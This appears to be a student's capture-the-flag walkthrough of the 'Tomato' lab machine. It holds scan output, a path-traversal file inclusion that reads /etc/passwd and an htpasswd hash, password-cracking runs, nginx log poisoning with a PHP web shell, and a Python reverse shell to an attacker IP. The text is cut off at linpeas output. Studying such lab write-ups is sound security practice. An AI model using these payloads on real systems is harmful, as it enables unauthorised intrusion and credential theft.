# Tomato Notes

In this file, there are all bunch of notes and attempts to exploit this machine

## Analysis

### nmap

```bash
    $ nmap -p- -T4 10.0.0.28

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:54 EST
    Nmap scan report for 10.0.0.28
    Host is up (0.024s latency).
    Not shown: 65531 closed tcp ports (reset)
    PORT     STATE SERVICE
    21/tcp   open  ftp
    80/tcp   open  http
    2211/tcp open  emwin
    8888/tcp open  sun-answerbook

    Nmap done: 1 IP address (1 host up) scanned in 16.33 seconds
```

#### Port 21 - FTP

```bash
    $ nmap -p 21 --script=ftp-anon,ftp-syst,ftp-vsftpd-backdoor 10.0.0.28

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 09:57 EST
    Nmap scan report for 10.0.0.28
    Host is up (0.019s latency).

    PORT   STATE SERVICE
    21/tcp open  ftp

    Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
```

#### Port 80 - HTTP

```bash
    $ nmap -sV -p 80 --script=http-title,http-server-header,http-headers,http-methods,http-enum 10.0.0.28

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:05 EST
    Nmap scan report for 10.0.0.28
    Host is up (0.019s latency).

    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Tomato
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    | http-headers: 
    |   Date: Sat, 15 Nov 2025 17:09:36 GMT
    |   Server: Apache/2.4.18 (Ubuntu)
    |   Last-Modified: Mon, 07 Sep 2020 08:37:23 GMT
    |   ETag: "28c-5aeb5209e6262"
    |   Accept-Ranges: bytes
    |   Content-Length: 652
    |   Vary: Accept-Encoding
    |   Connection: close
    |   Content-Type: text/html
    |   
    |_  (Request type: HEAD)
    |_http-server-header: Apache/2.4.18 (Ubuntu)

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
```

#### Port 2211 - emwin

```bash
    $ nmap -p 2211 -sV -sC 10.0.0.28

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:14 EST
    Nmap scan report for 10.0.0.28
    Host is up (0.019s latency).

    PORT     STATE SERVICE VERSION
    2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 d2:53:0a:91:8c:f1:a6:10:11:0d:9e:0f:22:f8:49:8e (RSA)
    |   256 b3:12:60:32:48:28:eb:ac:80:de:17:d7:96:77:6e:2f (ECDSA)
    |_  256 36:6f:52:ad:fe:f7:92:3e:a2:51:0f:73:06:8d:80:13 (ED25519)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds

    $ nmap -p 2211 --script=ssh-hostkey,ssh-auth-methods,ssh2-enum-algos 10.0.0.18
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:15 EST
    Nmap scan report for 10.0.0.18
    Host is up (0.019s latency).

    PORT     STATE  SERVICE
    2211/tcp closed emwin

    Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

#### Port 8888 - sun-answerbook

```bash
    $ nmap -p 8888 -sV -sC 10.0.0.28

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:19 EST
    Nmap scan report for 10.0.0.28
    Host is up (0.017s latency).

    PORT     STATE SERVICE VERSION
    8888/tcp open  http    nginx 1.10.3 (Ubuntu)
    |_http-server-header: nginx/1.10.3 (Ubuntu)
    |_http-title: 401 Authorization Required
    | http-auth: 
    | HTTP/1.1 401 Unauthorized\x0D
    |_  Basic realm=Private Property
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds

    $ nmap -sV -p 8888 --script=http-title,http-server-header,http-headers,http-methods,http-enum 10.0.0.28

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 10:20 EST
    Nmap scan report for 10.0.0.28
    Host is up (0.018s latency).

    PORT     STATE SERVICE VERSION
    8888/tcp open  http    nginx 1.10.3 (Ubuntu)
    |_http-server-header: nginx/1.10.3 (Ubuntu)
    | http-headers: 
    |   Server: nginx/1.10.3 (Ubuntu)
    |   Date: Sat, 15 Nov 2025 17:23:49 GMT
    |   Content-Type: text/html
    |   Content-Length: 204
    |   Connection: close
    |   WWW-Authenticate: Basic realm="Private Property"
    |   
    |_  (Request type: GET)
    |_http-title: 401 Authorization Required
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 61.71 seconds
```

### Attempts

#### dirb

We are going to try to use dirb to find out what directories and files are on the website

```bash
    $ dirb http://10.0.0.28

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Sat Nov 15 10:24:36 2025
    URL_BASE: http://10.0.0.28/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612

    ---- Scanning URL: http://10.0.0.28/ ----
    ==> DIRECTORY: http://10.0.0.28/antibot_image/
    
    + http://10.0.0.28/index.html (CODE:200|SIZE:652)

    + http://10.0.0.28/server-status (CODE:403|SIZE:274)                                                   
    

    ---- Entering directory: http://10.0.0.28/antibot_image/ ----
    (!) WARNING: Directory IS LISTABLE. No need to scan it.
        (Use mode '-w' if you want to scan it anyway)

    -----------------
    END_TIME: Sat Nov 15 10:26:11 2025
    DOWNLOADED: 4612 - FOUND: 2
```

#### info.php

After looking into the folder that takes us to `http://10.0.0.28/antibot_image/antibots/`, we find `php.info` and gather that:

- Server Administrator: webmaster@localhost 
- Apache Version: Apache/2.4.18 (Ubuntu)
- Apache API Version: 20120211
- DOCUMENT_ROOT: /var/www/html

Directives (under Core) that might make the website vulnerable

- allow_url_fopen = On
  - Enables remote URL streams → useful for SSRF and remote file access.

- open_basedir = no value
  - No filesystem restriction → allows reading/writing anywhere the PHP user can access.

- file_uploads = On
  - File uploads enabled → exploitable if any insecure upload point exists.

- upload_max_filesize = 2M
  - Allows uploading reasonably sized payloads (webshells, binaries, etc.).

- post_max_size = 8M
  - Allows POST requests large enough for most upload exploits.

- display_errors = Off
  - Errors not shown → attacker activity is hidden, making exploitation stealthier.

- allow_url_include = Off
  - (Not a vulnerability; listed for context. RFI via include() is blocked, but SSRF via fopen still works.)

- disable_functions = <many dangerous functions disabled>
  - Not a direct vulnerability but influences exploit paths. Command-exec webshells won't work, but file read/write shells will.

#### readme.txt

We also found readme.txt at `http://10.0.0.28/antibot_image/antibots/readme.txt` that pretty much tell's us that it is a WordPress website since it starts with:

```text
    === WordPress Stop and Block bots plugin Anti bots  ===
    Contributors: sminozzi
    Tags: robot, scrapper, botnet, spider, crawler
    Requires at least: 5.3
    Tested up to: 5.5
    Stable tag: 1.05
    License: GPLv2 or later
    License URI: http://www.gnu.org/licenses/gpl-2.0.html
```

#### ffuf

```bash
    $ ffuf -u http://10.0.0.28/FUZZ -w /usr/share/wordlists/rockyou.txt


            /'___\  /'___\           /___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
            \ \_\   \ \_\  \ \____/  \ \_\       
            \/_/    \/_/   \/___/    \/_/       

        v2.1.0-dev
    ________________________________________________

    :: Method           : GET
    :: URL              : http://10.0.0.28/FUZZ
    :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
    :: Follow redirects : false
    :: Calibration      : false
    :: Timeout          : 10
    :: Threads          : 40
    :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
    ________________________________________________

    #1bitch                 [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 22ms]
    #1pimp                  [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 21ms]
    #1hottie                [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 22ms]
    #1princess              [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 22ms]
    #1stunna                [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 23ms]
    #1love                  [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 25ms]
    #1angel                 [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 21ms]
    #1cutie                 [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 24ms]
    ??????                  [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 22ms]
    #1mommy                 [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 23ms]
    #1girl                  [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 22ms]
    #1babygirl              [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 20ms]
    #1lover                 [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 25ms]
    #1sexy                  [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 23ms]
    //////                  [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 21ms]
    #1baby                  [Status: 200, Size: 652, Words: 30, Lines: 21, Duration: 22ms]

    # And more
```

#### Images

IS IT STANDARD DATA
From the screenshots on `/antibots` we can say that the bots at `/bots-table/page/100`, `/bots-ip-table/page/47` and  `/premium` are whitelisted 

#### hydra

Trying to brute-force admin's password on ftp

```bash
  $ hydra -l webmaster -P /usr/share/wordlists/rockyou.txt 10.0.0.28 ftp
```

#### nmap brute-force

We are going to try to brute-forec login on the nginx login

```bash
  $ nmap --script http-auth --script-args http-auth.path=/ -p8888 10.0.0.28
```

#### nikto

```bash
  $ nikto -h http://10.0.0.28/antibot_image/antibots/

  - Nikto v2.5.0
  ---------------------------------------------------------------------------
  + Target IP:          10.0.0.28
  + Target Hostname:    10.0.0.28
  + Target Port:        80
  + Start Time:         2025-11-16 18:55:40 (GMT-5)
  ---------------------------------------------------------------------------
  + Server: Apache/2.4.18 (Ubuntu)
  + /antibot_image/antibots/: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
  + /antibot_image/antibots/: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
  + /antibot_image/antibots/: Directory indexing found.
  + No CGI Directories found (use '-C all' to force check all possible dirs)
  + Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
  + OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
  + /antibot_image/antibots/./: Directory indexing found.
  + /antibot_image/antibots/./: Appending '/./' to a directory allows indexing.
  + /antibot_image/antibots//: Directory indexing found.
  + /antibot_image/antibots//: Apache on Red Hat Linux release 9 reveals the root directory listing by default if there is no index page.
  + /antibot_image/antibots/%2e/: Directory indexing found.
  + /antibot_image/antibots/%2e/: Weblogic allows source code or directory listing, upgrade to v6.0 SP1 or higher. See: http://www.securityfocus.com/bid/2513
  + /antibot_image/antibots///: Directory indexing found.
  + /antibot_image/antibots/?PageServices: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269
  + /antibot_image/antibots/?wp-cs-dump: The remote server may allow directory listings through Web Publisher by forcing the server to show all files via 'open directory browsing'. Web Publisher should be disabled. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0269
  + /antibot_image/antibots/readme.txt: This might be interesting.
  + /antibot_image/antibots/info.php: Output from the phpinfo() function was found.
  + /antibot_image/antibots/info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
  + /antibot_image/antibots///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Directory indexing found.
  + /antibot_image/antibots///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Abyss 1.03 reveals directory listing when multiple /'s are requested. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1078
  + /antibot_image/antibots/info.php?file=http://blog.cirt.net/rfiinc.txt: Remote File Inclusion (RFI) from RSnake's RFI list. See: https://gist.github.com/mubix/5d269c686584875015a2
  + /antibot_image/antibots/license.txt: License file found may identify site software.
  + 8074 requests: 0 error(s) and 21 item(s) reported on remote host
  + End Time:           2025-11-16 18:57:29 (GMT-5) (109 seconds)
  ---------------------------------------------------------------------------
  + 1 host(s) tested
```

#### Local File Inclusion

##### Other Data

At `http://10.0.0.28/antibot_image/antibots/info.php`, we open the inspector and can find the comment `<!-- </?php include $_GET['image']; -->` 

If I now for example, try the following:

```bash
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
  # Or this
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=var/www/html/info.php
```

I get the data from the file. Here's waht we found:

```bash
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=/etc/passwd
  
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  sys:x:3:3:sys:/dev:/usr/sbin/nologin
  sync:x:4:65534:sync:/bin:/bin/sync
  games:x:5:60:games:/usr/games:/usr/sbin/nologin
  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
  irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
  systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
  systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
  systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
  syslog:x:104:108::/home/syslog:/bin/false
  _apt:x:105:65534::/nonexistent:/bin/false
  messagebus:x:106:110::/var/run/dbus:/bin/false
  uuidd:x:107:111::/run/uuidd:/bin/false
  tomato:x:1000:1000:Tomato,,,:/home/tomato:/bin/bash
  sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
  ftp:x:109:117:ftp daemon,,,:/srv/ftp:/bin/false
```

```bash
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=/etc/ssh/ssh_config

   # This is the ssh client system-wide configuration file.
  # See ssh_config(5) for more information.
  # This file provides defaults for users, and the values can be changed
  # in per-user configuration files or on the command line.

  # Configuration data is parsed as follows:
  #   1. command line options
  #   2. user-specific file
  #   3. system-wide file
  # Any configuration value is only changed the first time it is set.
  # Thus, host-specific definitions should be at the beginning of the
  # configuration file, and defaults at the end.

  # Site-wide defaults for some commonly used options.
  # For a comprehensive list of options and meanings, see ssh_config(5).

  Host *
      # ForwardAgent no
      # ForwardX11 no
      # ForwardX11Trusted yes
      # RhostsRSAAuthentication no
      # RSAAuthentication yes
      # PasswordAuthentication yes
      # HostbasedAuthentication no
      # GSSAPIAuthentication no
      # GSSAPIDelegateCredentials no
      # GSSAPIKeyExchange no
      # GSSAPITrustDNS no
      # BatchMode no
      # CheckHostIP yes
      # AddressFamily any
      # ConnectTimeout 0
      # StrictHostKeyChecking ask
      # IdentityFile ~/.ssh/identity
      # IdentityFile ~/.ssh/id_rsa
      # IdentityFile ~/.ssh/id_dsa
      # IdentityFile ~/.ssh/id_ecdsa
      # IdentityFile ~/.ssh/id_ed25519
      # Port 22
      # Protocol 2
      # Cipher 3des

      # Ciphers aes128-ctr,aes192-ctr,aes256-ctr,arcfour256,arcfour128,
      #         aes128-cbc,3des-cbc

      # MACs hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160

      # EscapeChar ~
      # Tunnel no
      # TunnelDevice any:any
      # PermitLocalCommand no
      # VisualHostKey no
      # ProxyCommand ssh -q -W %h:%p gateway.example.com
      # RekeyLimit 1G 1h

  SendEnv LANG LC_*
  HashKnownHosts yes
  GSSAPIAuthentication yes
  GSSAPIDelegateCredentials no
```

```bash
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=/etc/ssh/sshd_config

  # Package generated configuration file
  # See the sshd_config(5) manpage for details

  # What ports, IPs and protocols we listen for
  Port 2211

  # Use these options to restrict which interfaces/protocols sshd will bind to
  #ListenAddress ::
  #ListenAddress 0.0.0.0

  Protocol 2

  # HostKeys for protocol version 2
  HostKey /etc/ssh/ssh_host_rsa_key
  HostKey /etc/ssh/ssh_host_dsa_key
  HostKey /etc/ssh/ssh_host_ecdsa_key
  HostKey /etc/ssh/ssh_host_ed25519_key

  # Privilege Separation is turned on for security
  UsePrivilegeSeparation yes

  # Lifetime and size of ephemeral version 1 server key
  KeyRegenerationInterval 3600
  ServerKeyBits 1024

  # Logging
  SyslogFacility AUTH
  LogLevel INFO

  # Authentication:
  LoginGraceTime 120
  PermitRootLogin prohibit-password
  StrictModes yes
  RSAAuthentication yes
  PubkeyAuthentication yes
  #AuthorizedKeysFile  %h/.ssh/authorized_keys

  # Don't read the user's ~/.rhosts and ~/.shosts files
  IgnoreRhosts yes

  # For this to work you will also need host keys in /etc/ssh_known_hosts
  RhostsRSAAuthentication no

  # Similar for protocol version 2
  HostbasedAuthentication no
  #IgnoreUserKnownHosts yes

  # To enable empty passwords, change to yes (NOT RECOMMENDED)
  PermitEmptyPasswords no

  # Change to yes to enable challenge-response passwords
  ChallengeResponseAuthentication no

  # Change to no to disable tunnelled clear text passwords
  #PasswordAuthentication yes

  # Kerberos options
  #KerberosAuthentication no
  #KerberosGetAFSToken no
  #KerberosOrLocalPasswd yes
  #KerberosTicketCleanup yes

  # GSSAPI options
  #GSSAPIAuthentication no
  #GSSAPICleanupCredentials yes

  X11Forwarding yes
  X11DisplayOffset 10
  PrintMotd no
  PrintLastLog yes
  TCPKeepAlive yes
  #UseLogin no
  #MaxStartups 10:30:60
  #Banner /etc/issue.net

  # Allow client to pass locale environment variables
  AcceptEnv LANG LC_*

  Subsystem sftp /usr/lib/openssh/sftp-server

  # Set this to 'yes' to enable PAM authentication, account processing,
  # and session processing. If this is enabled, PAM authentication will
  # be allowed through the ChallengeResponseAuthentication and
  # PasswordAuthentication. Depending on your PAM configuration,
  # PAM authentication via ChallengeResponseAuthentication may bypass
  # the setting of "PermitRootLogin without-password".
  # If you just want the PAM account and session checks to run without
  # PAM authentication, then enable this but set PasswordAuthentication
  # and ChallengeResponseAuthentication to 'no'.
  UsePAM yes
```

```bash
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=/etc/apache2/apache2.conf

  # This is the main Apache server configuration file. It contains the
  # configuration directives that give the server its instructions.
  # See http://httpd.apache.org/docs/2.4/ for detailed information about
  # the directives and /usr/share/doc/apache2/README.Debian about Debian specific
  # hints.

  # Summary of how the Apache 2 configuration works in Debian:
  # The Apache 2 web server configuration in Debian is quite different to
  # upstream's suggested way to configure the web server. This is because Debian's
  # default Apache2 installation attempts to make adding and removing modules,
  # virtual hosts, and extra configuration directives as flexible as possible, in
  # order to make automating the changes and administering the server as easy as
  # possible.

  # It is split into several files forming the configuration hierarchy outlined
  # below, all located in the /etc/apache2/ directory:
  #
  # /etc/apache2/
  #   |-- apache2.conf
  #   |   `-- ports.conf
  #   |-- mods-enabled
  #   |   |-- *.load
  #   |   `-- *.conf
  #   |-- conf-enabled
  #   |   `-- *.conf
  #   `-- sites-enabled
  #       `-- *.conf
  #
  # * apache2.conf is the main configuration file.
  # * ports.conf determines listening ports.
  # * mods-enabled/, conf-enabled/, and sites-enabled/ hold activated configs.
  #
  # Use a2enmod/a2dismod, a2ensite/a2dissite, and a2enconf/a2disconf to manage them.

  # Global configuration
  # ------------------------------------------------------------------------------

  # ServerRoot: root directory for config, error, and log files.
  #ServerRoot "/etc/apache2"

  # Accept serialization lock file (must be local disk)
  #Mutex file:${APACHE_LOCK_DIR} default

  # PidFile is defined in /etc/apache2/envvars
  PidFile ${APACHE_PID_FILE}

  # Timeout: Seconds before send/receive timeout
  Timeout 300

  # KeepAlive: Allow multiple requests per connection
  KeepAlive On

  # MaxKeepAliveRequests: Set 0 for unlimited
  MaxKeepAliveRequests 100

  # How long to wait for the next request on the same connection
  KeepAliveTimeout 5

  # These need to be set in /etc/apache2/envvars
  User ${APACHE_RUN_USER}
  Group ${APACHE_RUN_GROUP}

  # HostnameLookups: Off by default for performance
  HostnameLookups Off

  # ErrorLog: Default error log location
  ErrorLog ${APACHE_LOG_DIR}/error.log

  # LogLevel: Severity of messages
  LogLevel warn

  # Include module configuration
  IncludeOptional mods-enabled/*.load
  IncludeOptional mods-enabled/*.conf

  # Include ports to listen on
  Include ports.conf

  # Default security model: deny filesystem outside /usr/share and /var/www
  <Directory />
      Options FollowSymLinks
      AllowOverride None
      Require all denied
  </Directory>

  <Directory /usr/share>
      AllowOverride None
      Require all granted
  </Directory>

  <Directory /var/www/>
      Options Indexes FollowSymLinks
      AllowOverride None
      Require all granted
  </Directory>

  # AccessFileName for directory-level overrides
  AccessFileName .htaccess

  # Prevent .htaccess and .htpasswd from being viewed by clients
  <FilesMatch "^\.ht">
      Require all denied
  </FilesMatch>

  # Log formats
  LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
  LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
  LogFormat "%h %l %u %t \"%r\" %>s %O" common
  LogFormat "%{Referer}i -> %U" referer
  LogFormat "%{User-agent}i" agent

  # Include generic config snippets
  IncludeOptional conf-enabled/*.conf

  # Include virtual host configurations
  IncludeOptional sites-enabled/*.conf

  # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

```bash
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=/etc/apache2/envvars

  # envvars - default environment variables for apache2ctl
  # This won't be correct after changing uid

  unset HOME

  # Support multiple apache2 instances
  if [ "${APACHE_CONFDIR##/etc/apache2-}" != "${APACHE_CONFDIR}" ] ; then
      SUFFIX="-${APACHE_CONFDIR##/etc/apache2-}"
  else
      SUFFIX=
  fi

  # Since there is no sane way to get the parsed apache2 config in scripts,
  # some settings are defined via environment variables and then used in
  # apache2ctl, /etc/init.d/apache2, /etc/logrotate.d/apache2, etc.

  export APACHE_RUN_USER=www-data
  export APACHE_RUN_GROUP=www-data

  # Temporary state file location
  # (May change to /run in later releases)
  export APACHE_PID_FILE=/var/run/apache2/apache2$SUFFIX.pid
  export APACHE_RUN_DIR=/var/run/apache2$SUFFIX
  export APACHE_LOCK_DIR=/var/lock/apache2$SUFFIX

  # Only /var/log/apache2 is handled by /etc/logrotate.d/apache2
  export APACHE_LOG_DIR=/var/log/apache2$SUFFIX

  ## Locale used by some modules like mod_dav
  export LANG=C

  ## Uncomment to use system default locale:
  #. /etc/default/locale
  export LANG

  ## Command used by 'apache2ctl status'
  ## Some 'www-browser' packages need '--dump' instead of '-dump'
  #export APACHE_LYNX='www-browser -dump'

  ## Increase file descriptor limit (default 8192)
  #APACHE_ULIMIT_MAX_FILES='ulimit -n 65536'

  ## Extra arguments passed to the Apache web server
  #export APACHE_ARGUMENTS=''

  ## Enable debug mode for maintainer scripts
  ## Produces verbose output during module or application installation
  #export APACHE2_MAINTSCRIPT_DEBUG=1
```

```bash
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=/etc/nginx/nginx.conf

  user www-data;
  worker_processes auto;
  pid /run/nginx.pid;

  events {
      worker_connections 768;
      # multi_accept on;
  }

  http {

      ##
      # Basic Settings
      ##
      sendfile on;
      tcp_nopush on;
      tcp_nodelay on;
      keepalive_timeout 65;
      types_hash_max_size 2048;
      # server_tokens off;
      # server_names_hash_bucket_size 64;
      # server_name_in_redirect off;

      include /etc/nginx/mime.types;
      default_type application/octet-stream;

      ##
      # SSL Settings
      ##
      ssl_protocols TLSv1 TLSv1.1 TLSv1.2;  # Dropping SSLv3, ref: POODLE
      ssl_prefer_server_ciphers on;

      ##
      # Logging Settings
      ##
      access_log /var/log/nginx/access.log;
      error_log  /var/log/nginx/error.log;

      ##
      # Gzip Settings
      ##
      gzip on;
      gzip_disable "msie6";
      # gzip_vary on;
      # gzip_proxied any;
      # gzip_comp_level 6;
      # gzip_buffers 16 8k;
      # gzip_http_version 1.1;
      # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

      ##
      # Virtual Host Configs
      ##
      include /etc/nginx/conf.d/*.conf;
      include /etc/nginx/sites-enabled/*;
  }

  #mail {
  #    # See sample authentication script at:
  #    # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
  #
  #    auth_http localhost/auth.php;
  #    pop3_capabilities "TOP" "USER";
  #    imap_capabilities "IMAP4rev1" "UIDPLUS";
  #
  #    server {
  #        listen localhost:110;
  #        protocol pop3;
  #        proxy on;
  #    }
  #
  #    server {
  #        listen localhost:143;
  #        protocol imap;
  #        proxy on;
  #    }
  #}
```

##### Relevant Data

After some searching around, we found the following file that contains a username and password

```bash
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=/etc/nginx/.htpasswd

  nginx:$apr1$azDw/Iwv$E7rIlqjeiX9Sx9.sMCcAZ0
```

With this, we can now crack the password using john

```bash
  # Attemp 1
  $ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt nginx-creds.txt
  
  Using default input encoding: UTF-8
  Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
  Will run 4 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  0g 0:00:00:41 DONE (2025-11-18 20:36) 0g/s 342983p/s 342983c/s 342983C/s !!!0mc3t..*7¡Vamos!
  Session completed.

  # Attempt 2
  $ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt --rules nginx-creds.txt
  
  Using default input encoding: UTF-8
  Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
  Will run 4 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  0g 0:00:01:04 4.26% (ETA: 21:02:27) 0g/s 318780p/s 318780c/s 318780C/s Ll59755311..Ll09131979
  Session completed. 
```


### nginx login attempts

If we try to login on nginx, and check the log file `http://10.0.0.28/antibot_image/antibots/info.php?image=/var/log/nginx/error.log` we can see the following:

```text
  cient: 10.0.1.10, server: _, request: "GET / HTTP/1.1", host: "10.0.0.28:8888" 2025/11/22 05:40:47 [error] 853#853: *29940 user "asd" was not found in "/etc/nginx/.htpasswd", client: 10.0.1.5, server: _, request: "GET / HTTP/1.1", host: "10.0.0.28:8888" 
```

Now, we need to inject on the username the following input to inject the a shell in php:

```bash
  $ <?php system($_GET['cmd']); ?>
```

With this, we now need to define the cmd query on the url, and the input will be the command executed on the cmd, like this

```bash
  $ http://10.0.0.28/antibot_image/antibots/info.php?image=/var/log/nginx/error.log&cmd=whoami

  # After all the output, on the username field we see 'tomato'
  [error] 853#853: *29998 user "tomato" was not found in "/etc/nginx/.htpasswd", client: 10.0.1.6, server: _, request: "GET / HTTP/1.1", host: "10.0.0.28:8888" 
```

And now, after checking if the machine has python, we can try to execute a reverse shell
```bash
  $ export RHOST="10.0.1.5";export RPORT=9002;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Now we get a shell, we put `linpeas.sh` and execute it on the target machine. We do this by hosting a local webserver and doing a `wget 10.0.1.5/linpeas.sh` and we get the file

Then we execute linpeas.sh

#### linpeas.sh

```bash
  $ ./linpeas.sh
                              ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                      ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
              ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
          ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
          ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
